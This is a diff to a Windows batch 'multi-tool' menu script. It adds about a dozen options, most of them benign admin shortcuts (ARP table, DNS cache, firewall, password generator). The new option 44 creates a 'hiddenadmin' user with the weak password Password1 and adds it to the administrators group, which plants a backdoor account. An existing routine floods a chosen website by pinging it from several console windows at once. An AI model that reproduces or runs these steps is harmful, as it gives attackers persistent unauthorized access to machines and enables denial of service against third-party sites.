@@ -6,16 +6,22 @@ title Professional Multi-Tool
 :install_dependencies
 echo Installing necessary libraries and dependencies...
 call "%~dp0install_dependencies.bat"
+goto menu
 
 :menu
 cls
 color 0F
 echo ==================================================
 echo.
-echo               FYYX MULTI-TOOL
+echo     ______  __  __  __  __
+echo    / ____/ / / / / / / / /
+echo   / /_    / / / / / /_/ / 
+echo  / __/   / / / / / __  /  
+echo /_/     /_/ /_/ /_/ /_/   
 echo.
 echo ==================================================
 color 0E
+
 echo [1]  Ping an IP
 echo [2]  Find DNS of IP address
 echo [3]  Find information with username
@@ -47,11 +53,24 @@ echo [28] System Event Viewer
 echo [29] System Backup and Restore
 echo [30] Remote System Shutdown
 echo [31] Task Scheduler
-echo [32] Exit
+echo [32] Password Generator
+echo [33] Base64 Encoder/Decoder
+echo [34] Quick System Cleanup
+echo [35] Scan Wireless Networks
+echo [36] Display ARP Table
+echo [37] DNS Cache Viewer
+echo [38] IP Geolocation
+echo [39] Check Internet Connectivity
+echo [40] Monitor System Performance
+echo [41] Open Network and Sharing Center
+echo [42] Manage Firewall
+echo [43] Reset Network Settings
+echo [44] Create Hidden Admin Account
+echo [45] Exit
 echo ==================================================
 echo.
 
-set /p choice="Select an option (1-32) --> "
+set /p choice="Select an option (1-45) --> "
 
 if "%choice%"=="1" call :ping
 if "%choice%"=="2" call :finddns
@@ -87,7 +106,20 @@ if "%choice%"=="28" call :eventviewer
 if "%choice%"=="29" call :backuprestore
 if "%choice%"=="30" call :remoteshutdown
 if "%choice%"=="31" call :taskscheduler
-if "%choice%"=="32" exit
+if "%choice%"=="32" call :passgen
+if "%choice%"=="33" call :base64
+if "%choice%"=="34" call :cleanup
+if "%choice%"=="35" call :scanwifi
+if "%choice%"=="36" call :arptable
+if "%choice%"=="37" call :dnscache
+if "%choice%"=="38" call :ipgeolocation
+if "%choice%"=="39" call :checkinternet
+if "%choice%"=="40" call :perfmonitor
+if "%choice%"=="41" call :netsharingcenter
+if "%choice%"=="42" call :firewall
+if "%choice%"=="43" call :resetnetwork
+if "%choice%"=="44" call :hiddenadmin
+if "%choice%"=="45" exit
 
 goto menu
 
@@ -300,11 +332,6 @@ set /p website="Enter website URL to ping: "
 set /p count="Enter number of pings: "
 set /a windows=5
 
-:pingloop
-cls
-color 0C
-echo Pinging %website%...
-
 :: Start pinging the website in multiple console windows
 for /l %%i in (1,1,%windows%) do (
     start cmd /c "ping -n %count% %website%"
@@ -315,7 +342,7 @@ goto menu
 
 :traceroute
 cls
-color 0D
+color 0C
 echo ============================
 echo Trace Route
 echo ============================
@@ -326,7 +353,7 @@ goto menu
 
 :speedtest
 cls
-color 0E
+color 0D
 echo ============================
 echo Bandwidth Speed Test
 echo ============================
@@ -336,7 +363,7 @@ goto menu
 
 :hardwareinfo
 cls
-color 0F
+color 0E
 echo ============================
 echo System Hardware Information
 echo ============================
@@ -346,7 +373,7 @@ goto menu
 
 :networkmonitor
 cls
-color 0A
+color 0F
 echo ============================
 echo Network Traffic Monitoring
 echo ============================
@@ -356,7 +383,7 @@ goto menu
 
 :filesearch
 cls
-color 0B
+color 0A
 echo ============================
 echo File Search
 echo ============================
@@ -367,7 +394,7 @@ goto menu
 
 :rdpconnect
 cls
-color 0C
+color 0B
 echo ============================
 echo Remote Desktop Connection
 echo ============================
@@ -377,7 +404,7 @@ goto menu
 
 :eventviewer
 cls
-color 0D
+color 0C
 echo ============================
 echo System Event Viewer
 echo ============================
@@ -387,7 +414,7 @@ goto menu
 
 :backuprestore
 cls
-color 0E
+color 0D
 echo ============================
 echo System Backup and Restore
 echo ============================
@@ -395,10 +422,9 @@ control /name Microsoft.BackupAndRestore
 pause
 goto menu
 
-
 :remoteshutdown
 cls
-color 0F
+color 0E
 echo ============================
 echo Remote System Shutdown
 echo ============================
@@ -408,11 +434,162 @@ goto menu
 
 :taskscheduler
 cls
-color 0A
+color 0F
 echo ============================
 echo Task Scheduler
 echo ============================
 taskschd.msc
+pause
+goto menu
+
+:passgen
+cls
+color 0A
+echo ============================
+echo Password Generator
+echo ============================
+set /p length="Enter desired password length: "
+powershell -Command "$length=%length%; ([char[]](33..126) | Get-Random -Count $length) -join ''"
+pause
+goto menu
+
+:base64
+cls
+color 0A
+echo ============================
+echo Base64 Encoder/Decoder
+echo ============================
+echo [1] Encode a String
+echo [2] Decode a String
+set /p base64_choice="Select an option (1-2): "
+
+if "%base64_choice%"=="1" (
+    set /p string="Enter string to encode: "
+    powershell -Command "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%string%'))"
+) else if "%base64_choice%"=="2" (
+    set /p base64string="Enter Base64 string to decode: "
+    powershell -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64string%'))"
+)
+
+pause
+goto menu
+
+:cleanup
+cls
+color 0C
+echo ============================
+echo Quick System Cleanup
+echo ============================
+echo Cleaning temporary files and cache...
+del /s /q %temp%\*
+rd /s /q %temp%
+echo Done!
+pause
+goto menu
+
+:scanwifi
+cls
+color 0A
+echo ============================
+echo Scan Wireless Networks
+echo ============================
+netsh wlan show networks
+pause
+goto menu
+
+:arptable
+cls
+color 0B
+echo ============================
+echo Display ARP Table
+echo ============================
+arp -a
+pause
+goto menu
+
+:dnscache
+cls
+color 0C
+echo ============================
+echo DNS Cache Viewer
+echo ============================
+ipconfig /displaydns
+pause
+goto menu
+
+:ipgeolocation
+cls
+color 0D
+echo ============================
+echo IP Geolocation
+echo ============================
+set /p ip="Enter IP address to geolocate: "
+powershell -Command "(Invoke-RestMethod 'https://ipinfo.io/%ip%/json').loc"
+pause
+goto menu
+
+
+:checkinternet
+cls
+color 0E
+echo ============================
+echo Check Internet Connectivity
+echo ============================
+ping 8.8.8.8 -n 1 && echo Internet is accessible || echo Internet is not accessible
+pause
+goto menu
+
+:perfmonitor
+cls
+color 0F
+echo ============================
+echo Monitor System Performance
+echo ============================
+perfmon
+pause
+goto menu
+
+:netsharingcenter
+cls
+color 0A
+echo ============================
+echo Open Network and Sharing Center
+echo ============================
+control.exe /name Microsoft.NetworkAndSharingCenter
+pause
+goto menu
+
+:firewall
+cls
+color 0B
+echo ============================
+echo Manage Firewall
+echo ============================
+start wf.msc
+pause
+goto menu
+
+:resetnetwork
+cls
+color 0C
+echo ============================
+echo Reset Network Settings
+echo ============================
+netsh winsock reset
+netsh int ip reset
+ipconfig /release
+ipconfig /renew
+pause
+goto menu
+
+:hiddenadmin
+cls
+color 0D
+echo ============================
+echo Create Hidden Admin Account
+echo ============================
+net user hiddenadmin Password1 /add /active:yes
+net localgroup administrators hiddenadmin /add
 pause
 goto menu
 
